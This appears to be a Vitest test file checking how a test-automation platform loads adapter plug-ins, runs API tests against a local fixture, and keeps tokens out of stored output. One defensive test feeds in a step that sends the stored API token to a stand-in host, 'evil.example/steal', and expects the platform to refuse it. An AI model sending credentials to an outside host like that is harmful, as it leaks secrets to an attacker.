/**
 * Adapter plug-ins inside a real platform: the real example plug-in (examples/adapter-plugin) is loaded, an API test stored for its
 * framework is rendered and REALLY run by the job runner against a local fixture API (real HTTP, real Node child process), a failing
 * assertion is reported as a failure with its reason, a broken plug-in is reported without stopping anything, nothing loads (or is
 * even imported) with the switch off or no API key, and a test whose plug-in is gone fails early, in words, with its data kept.
 * No model, no browser, no external site.
 *
 * Run: node scripts/with-lock.mjs browser -- node node_modules/vitest/vitest.mjs run tests/plugin.test.ts
 * Ports: fixture API 6270.
 */
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { loadConfig, REPO_ROOT } from "../src/config.js";
import { listAdapters } from "../src/engine/frameworks/index.js";
import { loadConfiguredPlugins, unloadPlugins } from "../src/engine/frameworks/plugin-loader.js";
import { bootstrap, type Platform } from "../src/platform/bootstrap.js";
import { getAgentServices } from "../src/platform/agent-services.js";
import { HttpError } from "../src/platform/http-error.js";
import { DEFAULT_JOB_OPTIONS } from "../src/platform/repo.js";
import { buildServer } from "../src/platform/server.js";
import { Worker } from "../src/platform/worker.js";

const PORT = 6270;
const APP = `http://127.0.0.1:${PORT}`;
const KEY = "plugin-test-key-5c1d";
const TOKEN = "PLUG-api-token-9f3b7a21";
const EXAMPLE = path.join(REPO_ROOT, "examples", "adapter-plugin");
const BUILT_INS = ["playwright", "playwright-api", "taqwright", "windows-uia", "taqwright-ios"];
const quiet = { warn: () => undefined, log: () => undefined };
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const DONE = ["COMPLETED", "PARTIALLY_COMPLETED", "FAILED"];

// ── the fixture API ─────────────────────────────────────────────────────────
let appServer: http.Server;
const seenAuth: string[] = [];
const startApp = () =>
    new Promise<void>((resolve) => {
        appServer = http.createServer((req, res) => {
            const url = new URL(req.url ?? "/", APP);
            const json = (status: number, body: unknown) => {
                res.writeHead(status, { "content-type": "application/json" });
                res.end(JSON.stringify(body));
            };
            if (url.pathname === "/api/items") return json(200, [{ id: 1, name: "Ada" }, { id: 2, name: "Bo" }]);
            const item = /^\/api\/items\/(\d+)$/.exec(url.pathname);
            if (item) return Number(item[1]) <= 2 ? json(200, { id: Number(item[1]), name: item[1] === "1" ? "Ada" : "Bo" }) : json(404, { error: "no such item" });
            if (url.pathname === "/api/me") {
                const auth = String(req.headers.authorization ?? "");
                seenAuth.push(auth);
                return auth === `Bearer ${TOKEN}` ? json(200, { user: "ada" }) : json(401, { error: "sign in" });
            }
            json(404, { error: "not found" });
        });
        appServer.listen(PORT, "127.0.0.1", () => resolve());
    });

const apiSpec = (title: string, steps: unknown[]) => ({ title, kind: "api", category: "Plug-in API", steps });
const ok = (path: string, expected = 200) => [{ action: "request", method: "GET", path }, { action: "assertResponse", check: "status", expected }];

interface Env {
    platform: Platform;
    server: Awaited<ReturnType<typeof buildServer>>;
    dataDir: string;
    call(method: "GET" | "POST" | "PUT" | "DELETE", url: string, payload?: unknown, headers?: Record<string, string>): Promise<{ status: number; body: any }>;
    waitJob(jobId: string): Promise<any>;
}

async function makeEnv(label: string, over: Record<string, string>): Promise<Env & { config: ReturnType<typeof loadConfig> }> {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), `aitp-plugin-${label}-`));
    const config = loadConfig({ DATA_DIR: dataDir, SECRET_KEY: "test-secret-key-0123456789", CONCURRENCY: "2", MAX_REPAIR_ATTEMPTS: "0", ...over });
    const platform = bootstrap(config);
    // As src/main.ts does: plug-ins load before the server accepts a request.
    await loadConfiguredPlugins(config, quiet);
    const server = await buildServer(platform);
    const headers: Record<string, string> = over.API_KEY ? { "x-api-key": over.API_KEY } : {};
    const call: Env["call"] = async (method, url, payload, hdr) => {
        const res = await server.inject({ method, url, payload: payload as never, headers: { ...(hdr ?? headers), ...(payload !== undefined ? { "content-type": "application/json" } : {}) } });
        return { status: res.statusCode, body: res.body && res.headers["content-type"]?.toString().includes("json") ? JSON.parse(res.body) : res.body };
    };
    const waitJob: Env["waitJob"] = async (jobId) => {
        for (let i = 0; i < 400; i++) {
            const j = (await call("GET", `/api/test-generation/${jobId}`)).body;
            if (DONE.includes(j.status)) return j;
            await sleep(250);
        }
        throw new Error("job did not finish");
    };
    return { platform, server, dataDir, call, waitJob, config };
}

const close = async (e: Env) => {
    await e.server.close();
    e.platform.db.close();
    fs.rmSync(e.dataDir, { recursive: true, force: true });
};

beforeAll(async () => {
    await startApp();
});
afterAll(async () => {
    unloadPlugins();
    await new Promise<void>((r) => appServer.close(() => r()));
});

// ── Part 1: plug-ins on ─────────────────────────────────────────────────────

describe("adapter plug-ins switched on (ALLOW_ADAPTER_PLUGINS=true with an API key)", () => {
    let e: Env & { config: ReturnType<typeof loadConfig> };
    let worker: Worker | undefined;
    let brokenDir: string;
    let projectId: string;
    const tests: Record<string, string> = {};
    const startWorker = () => {
        worker = new Worker({ ...e.platform }, 100);
        worker.start();
    };
    const stopWorker = async () => {
        await worker?.stop();
        worker = undefined;
    };
    const detail = async (key: string) => (await e.call("GET", `/api/tests/${tests[key]}`)).body;
    const importSpecs = (specs: unknown[], extra: Record<string, unknown> = {}) => e.call("POST", `/api/projects/${projectId}/specs`, { specs, baseUrl: APP, ...extra });

    beforeAll(async () => {
        brokenDir = fs.mkdtempSync(path.join(os.tmpdir(), "aitp-plugin-broken-"));
        const broken = path.join(brokenDir, "broken-plugin");
        fs.mkdirSync(broken);
        fs.writeFileSync(path.join(broken, "plugin.json"), JSON.stringify({ name: "broken-plugin", version: "0.1.0", apiVersion: 1, adapters: [{ id: "broken-one", label: "Broken" }] }));
        fs.writeFileSync(path.join(broken, "adapter.mjs"), `throw new Error("this plug-in cannot start");\n`);
        e = await makeEnv("on", { API_KEY: KEY, ALLOW_ADAPTER_PLUGINS: "true", ADAPTER_PLUGINS: [EXAMPLE, broken].join(";") });
        startWorker();
        projectId = (await e.call("POST", "/api/projects", { name: "Plug-in project" })).body.id;
    }, 60_000);
    afterAll(async () => {
        await stopWorker();
        unloadPlugins();
        await close(e);
        fs.rmSync(brokenDir, { recursive: true, force: true });
    });

    it("protects every route with the API key", async () => {
        expect((await e.call("GET", "/api/config", undefined, {})).status).toBe(401);
        expect((await e.call("GET", "/api/config", undefined, { "x-api-key": "wrong" })).status).toBe(401);
        expect((await e.call("POST", `/api/projects/${projectId}/specs`, { specs: [apiSpec("x api", ok("/api/items"))], baseUrl: APP, framework: "node-http-check" }, {})).status).toBe(401);
    });

    it("lists the example plug-in, labelled with its name and version, and says what failed to load", async () => {
        const { status, body } = await e.call("GET", "/api/config");
        expect(status).toBe(200);
        expect(body.adapters.map((a: { id: string }) => a.id)).toEqual([...BUILT_INS, "node-http-check"]);
        expect(body.adapters.slice(0, 5).every((a: { plugin?: unknown }) => a.plugin === undefined)).toBe(true);
        expect(body.adapters[5]).toMatchObject({ id: "node-http-check", label: "Node HTTP check (example plug-in)", kinds: ["api"], executable: true, runtime: "node-http-check", needs: { node: true }, plugin: { name: "node-http-check", version: "1.0.0" } });
        expect(body.frameworks.map((f: { framework: string }) => f.framework)).toContain("node-http-check");
        expect(body.adapterPlugins).toMatchObject({ requested: true, enabled: true, configured: 2 });
        expect(body.adapterPlugins.loaded).toEqual([{ name: "node-http-check", version: "1.0.0", description: expect.stringContaining("plain Node.js"), adapters: [{ id: "node-http-check", label: "Node HTTP check (example plug-in)" }] }]);
        expect(body.adapterPlugins.problems).toEqual([{ plugin: "broken-plugin", message: expect.stringContaining("could not be loaded: this plug-in cannot start") }]);
        // Names only: no server folder in the answer.
        const text = JSON.stringify(body);
        expect(text).not.toContain(brokenDir.replace(/\\/g, "\\\\"));
        expect(text).not.toContain(REPO_ROOT.replace(/\\/g, "\\\\"));
        expect(text).not.toContain(KEY);
    });

    it("renders and really runs an API test stored for the plug-in's framework, and VALIDATES it", async () => {
        const imp = await importSpecs(
            [apiSpec("Items are listed", [...ok("/api/items"), { action: "assertResponse", check: "jsonType", expected: "array" }, { action: "assertResponse", check: "jsonPath", path: "0.name", expected: "Ada" }]), apiSpec("Item 3 does not exist", ok("/api/items/3", 404)), apiSpec("Signed in as the stored account", ok("/api/me"))],
            { framework: "node-http-check", credentials: { apiToken: TOKEN } },
        );
        expect(imp.status, JSON.stringify(imp.body)).toBe(202);
        imp.body.tests.forEach((t: { id: string }, i: number) => (tests[["list", "missing", "me"][i]!] = t.id));
        const job = await e.waitJob(imp.body.jobId);
        expect(job.status, JSON.stringify(job)).toBe("COMPLETED");
        for (const k of ["list", "missing", "me"]) {
            const d = await detail(k);
            expect(d.framework, k).toBe("node-http-check");
            expect(d.validationStatus, `${k}: ${d.validationReason}`).toBe("VALIDATED");
            expect(d.executions.length).toBeGreaterThan(0);
            expect(d.executions[0].status).toBe("passed");
        }
        // The stored account's token reached the fixture API (through the child's environment), and is not in anything the platform keeps.
        expect(seenAuth).toContain(`Bearer ${TOKEN}`);
        const d = await detail("list");
        expect(d.scripts).toHaveLength(1);
        expect(d.scripts[0]).toMatchObject({ framework: "node-http-check", filename: expect.stringMatching(/^API-\d+\.node-http-check\.mjs$/), executable: true });
        const everything = JSON.stringify([d, await detail("me"), (await e.call("GET", `/api/test-generation/${imp.body.jobId}/events`)).body, (await e.call("GET", `/api/projects/${projectId}/tests`)).body]);
        expect(everything).not.toContain(TOKEN);
        // The script text is plain and carries no secret or credential names.
        const script: string = d.scripts[0].content;
        expect(script).toContain('import assert from "node:assert/strict"');
        expect(script).not.toMatch(/sk-|api_key|TEST_PASSWORD|password:/);
        expect(script).not.toContain(TOKEN);
        // Recorded responses came from the plug-in's result.
        expect((await e.call("GET", `/api/tests/${tests.list}/script`)).body).toBe(script);
    }, 120_000);

    it("reports a deliberately failing assertion as a failure, with the reason", async () => {
        const imp = await importSpecs([apiSpec("Item 1 does not exist (wrong on purpose)", ok("/api/items/1", 404))], { framework: "node-http-check" });
        expect(imp.status, JSON.stringify(imp.body)).toBe(202);
        tests.wrong = imp.body.tests[0].id;
        await e.waitJob(imp.body.jobId);
        const d = await detail("wrong");
        expect(d.validationStatus).toBe("FAILED_VALIDATION");
        expect(d.validationReason).toContain("Expected status 404 but got 200");
        expect(d.executions[0].status).toBe("failed");
        expect(d.executions[0].steps.map((s: { status: string }) => s.status)).toEqual(["passed", "failed"]);
    }, 120_000);

    it("accepts a plug-in framework at import only when it is loaded and runs that kind of test", async () => {
        const web = await importSpecs([{ title: "A web test", kind: "web", category: "W", steps: [{ action: "navigate", url: "/" }] }], { framework: "node-http-check", validate: false });
        expect(web.status).toBe(400);
        expect(web.body.error).toMatch(/Node HTTP check \(example plug-in\) does not run web tests/);
        const builtIn = await importSpecs([apiSpec("An API test", ok("/api/items"))], { framework: "playwright", validate: false });
        expect(builtIn.status).toBe(400);
        expect(builtIn.body.error).toMatch(/Only a framework added by an adapter plug-in can be chosen/);
        const unknown = await importSpecs([apiSpec("An API test", ok("/api/items"))], { framework: "selenium", validate: false });
        expect(unknown.status).toBe(400);
        expect(unknown.body.error).toMatch(/"selenium" is not available/);
        // Nothing was stored by the refused imports.
        const all = (await e.call("GET", `/api/projects/${projectId}/tests`)).body as Array<{ title: string }>;
        expect(all.map((t) => t.title)).not.toContain("A web test");
        // A step that would send the stored token to another site is refused at import, whatever the framework.
        const leak = await importSpecs([apiSpec("Sends the token away", [{ action: "request", method: "GET", path: "https://evil.example/steal", auth: "default" }])], { framework: "node-http-check", validate: false, credentials: { apiToken: TOKEN } });
        expect(leak.status).toBe(400);
    });

    it("refuses a step the example does not support with a plain message, and runs the others", async () => {
        const imp = await importSpecs([apiSpec("Uses a check the example lacks", [...ok("/api/items"), { action: "assertResponse", check: "securityHeaders" }])], { framework: "node-http-check", validate: false });
        expect(imp.status).toBe(422);
        expect(imp.body.error).toMatch(/The plug-in "node-http-check" could not render this test: The check "securityHeaders" is not supported/);
    });

    it("keeps built-in tests exactly as they were while plug-ins are loaded", async () => {
        const imp = await importSpecs([apiSpec("Built-in API test", ok("/api/items"))]);
        expect(imp.status, JSON.stringify(imp.body)).toBe(202);
        const job = await e.waitJob(imp.body.jobId);
        expect(job.status).toBe("COMPLETED");
        const d = (await e.call("GET", `/api/tests/${imp.body.tests[0].id}`)).body;
        expect(d.framework).toBe("playwright-api");
        expect(d.validationStatus, d.validationReason).toBe("VALIDATED");
        expect(d.scripts[0].filename).toMatch(/\.spec\.ts$/);
    }, 180_000);

    it("runs plug-in tests in a normal run only, and on the server only", async () => {
        const create = (options: Record<string, unknown>) => {
            const app = e.platform.repo.getLatestApplicationPublic(projectId)!;
            return () => e.platform.repo.createJob(projectId, app.id as string, { ...DEFAULT_JOB_OPTIONS, ...options } as never);
        };
        for (const mode of ["variants", "environment", "plain"]) {
            const attempt = create({ mode, testIds: [tests.list], ...(mode === "variants" ? { variants: ["firefox"] } : {}), ...(mode === "environment" ? { environment: "staging" } : {}), ...(mode === "plain" ? { plainPrompt: "x", rewriteTestId: tests.list } : {}) });
            await expect(attempt(), mode).rejects.toThrow(HttpError);
            await expect(attempt(), mode).rejects.toThrow(/plug-in framework "node-http-check"/);
        }
        // A project whose tests run on a runner agent: the agent has no copy of the plug-in.
        const svc = getAgentServices(e.platform);
        svc.store.setRunner(projectId, { runOn: "agent", agentId: null });
        try {
            const attempt = create({ mode: "validate", testIds: [tests.list] });
            await expect(attempt()).rejects.toThrow(/runs on the platform computer only: runners do not have plug-ins. This project runs its tests on runners/);
        } finally {
            svc.store.setRunner(projectId, { runOn: "platform", agentId: null });
        }
    });

    it("when the plug-in is gone, a run is refused in words and nothing is deleted; when it is back, it runs again", async () => {
        const before = await detail("list");
        unloadPlugins(); // the server was restarted without the plug-in
        expect(listAdapters().map((a) => a.id)).toEqual(BUILT_INS);
        const refused = await e.call("POST", `/api/tests/${tests.list}/validate`, {});
        expect(refused.status).toBe(409);
        expect(refused.body.error).toMatch(/Nothing was deleted/);
        const job = () => {
            const app = e.platform.repo.getLatestApplicationPublic(projectId)!;
            return e.platform.repo.createJob(projectId, app.id as string, { ...DEFAULT_JOB_OPTIONS, mode: "validate", testIds: [tests.list] } as never);
        };
        await expect(job()).rejects.toThrow(HttpError);
        await expect(job()).rejects.toThrow(/testing framework "node-http-check", which an adapter plug-in provides and which is not loaded now/);
        await expect(job()).rejects.toThrow(/Nothing was deleted/);
        // The test, its script and its results are all still there.
        const after = await detail("list");
        expect(after.framework).toBe("node-http-check");
        expect(after.validationStatus).toBe("VALIDATED");
        expect(after.scripts).toEqual(before.scripts);
        expect(after.executions).toEqual(before.executions);
        expect((await e.call("GET", `/api/tests/${tests.list}/script`)).status).toBe(200);
        expect((await e.call("GET", `/api/projects/${projectId}/tests`)).body).toHaveLength(5);
        // The configuration answer says plainly that nothing is loaded.
        const cfg = (await e.call("GET", "/api/config")).body;
        expect(cfg.adapters.map((a: { id: string }) => a.id)).toEqual(BUILT_INS);

        await loadConfiguredPlugins(e.config, quiet);
        const rerun = await e.call("POST", `/api/tests/${tests.list}/validate`, {});
        expect(rerun.status, JSON.stringify(rerun.body)).toBe(202);
        expect((await e.waitJob(rerun.body.jobId)).status).toBe("COMPLETED");
        expect((await detail("list")).validationStatus).toBe("VALIDATED");
    }, 120_000);

    it("a job already queued when the plug-in disappears fails early with a plain message, and the test keeps its data", async () => {
        await stopWorker();
        const app = e.platform.repo.getLatestApplicationPublic(projectId)!;
        const queued = await e.platform.repo.createJob(projectId, app.id as string, { ...DEFAULT_JOB_OPTIONS, mode: "validate", testIds: [tests.list, tests.missing] } as never);
        unloadPlugins();
        startWorker();
        const job = await e.waitJob(queued.id);
        expect(job.status).toBe("FAILED");
        expect(job.error).toMatch(/testing framework "node-http-check"/);
        expect(job.error).toMatch(/Nothing was deleted/);
        expect(job.error).not.toMatch(/\n\s+at /);
        expect(JSON.stringify((await e.call("GET", `/api/test-generation/${queued.id}/events`)).body)).toMatch(/was not run/);
        const d = await detail("list");
        expect(d.validationStatus).toBe("VALIDATED");
        expect(d.executions.length).toBeGreaterThan(0);
        await loadConfiguredPlugins(e.config, quiet);
    }, 120_000);
});

// ── Part 2: plug-ins off ────────────────────────────────────────────────────

describe("adapter plug-ins left off", () => {
    let dir: string;
    let marker: string;
    beforeAll(() => {
        unloadPlugins();
        dir = fs.mkdtempSync(path.join(os.tmpdir(), "aitp-plugin-off-"));
        marker = path.join(dir, "imported.txt");
        const p = path.join(dir, "marker-plugin");
        fs.mkdirSync(p);
        fs.writeFileSync(path.join(p, "plugin.json"), JSON.stringify({ name: "marker-plugin", version: "1.0.0", apiVersion: 1, adapters: [{ id: "marker-one", label: "Marker" }] }));
        // Importing this module writes a file. If the platform never imports it, the file never appears.
        fs.writeFileSync(path.join(p, "adapter.mjs"), `import fs from "node:fs";\nfs.writeFileSync(${JSON.stringify(marker)}, "imported");\nexport default { id: "marker-one", label: "Marker", kinds: ["api"], executable: false, runtime: "marker-rt", needs: { node: true }, traits: { visionJudgement: false, cleanupLedger: false, browserRepair: false }, render() { return { filename: "M.txt", content: "m" }; }, async execute() { return []; } };\n`);
    });
    afterAll(() => {
        unloadPlugins();
        fs.rmSync(dir, { recursive: true, force: true });
    });

    const cases: Array<[string, Record<string, string>, RegExp | undefined]> = [
        ["the switch is not set", { API_KEY: KEY }, /ALLOW_ADAPTER_PLUGINS is not true/],
        ["the switch is set to something other than true", { API_KEY: KEY, ALLOW_ADAPTER_PLUGINS: "yes" }, /ALLOW_ADAPTER_PLUGINS is not true/],
        ["the switch is set but there is no API key", { ALLOW_ADAPTER_PLUGINS: "true" }, /ignored because API_KEY is not set/],
    ];
    it.each(cases)("loads and imports nothing when %s", async (name, env, reason) => {
        const e = await makeEnv("off", { ...env, ADAPTER_PLUGINS: [EXAMPLE, path.join(dir, "marker-plugin")].join(";") });
        try {
            const { status, body } = await e.call("GET", "/api/config");
            expect(status).toBe(200);
            expect(body.adapters.map((a: { id: string }) => a.id), name).toEqual(BUILT_INS);
            expect(body.adapterPlugins).toMatchObject({ enabled: false, loaded: [], problems: [], configured: 2 });
            expect(body.adapterPlugins.requested).toBe(env.ALLOW_ADAPTER_PLUGINS === "true");
            expect(body.adapterPlugins.reason).toMatch(reason!);
            expect(fs.existsSync(marker), "the plug-in's module was imported").toBe(false);
            // A test cannot be stored for a framework that is not there.
            const projectId = (await e.call("POST", "/api/projects", { name: "Off" })).body.id;
            const imp = await e.call("POST", `/api/projects/${projectId}/specs`, { specs: [apiSpec("An API test", ok("/api/items"))], baseUrl: APP, framework: "node-http-check", validate: false });
            expect(imp.status).toBe(400);
            expect(imp.body.error).toMatch(/"node-http-check" is not available/);
        } finally {
            await close(e);
        }
    }, 60_000);

    it("starts normally with nothing listed and the switch on: no plug-in, no problem", async () => {
        const e = await makeEnv("empty", { API_KEY: KEY, ALLOW_ADAPTER_PLUGINS: "true" });
        try {
            const body = (await e.call("GET", "/api/config")).body;
            expect(body.adapterPlugins).toEqual({ requested: true, enabled: true, configured: 0, loaded: [], problems: [] });
            expect(body.adapters.map((a: { id: string }) => a.id)).toEqual(BUILT_INS);
        } finally {
            unloadPlugins();
            await close(e);
        }
    }, 60_000);

    it("does not take paths from the API or the UI: only the environment decides", async () => {
        const e = await makeEnv("paths", { API_KEY: KEY });
        try {
            for (const route of ["/api/config?adapterPlugins=" + encodeURIComponent(EXAMPLE), "/api/plugins", "/api/adapter-plugins"]) {
                const res = await e.call("GET", route);
                if (res.status === 200) expect(res.body.adapters.map((a: { id: string }) => a.id)).toEqual(BUILT_INS);
                else expect(res.status).toBe(404);
            }
            expect((await e.call("POST", "/api/adapter-plugins", { path: EXAMPLE })).status).toBe(404);
            expect(listAdapters().map((a) => a.id)).toEqual(BUILT_INS);
        } finally {
            await close(e);
        }
    }, 60_000);
});
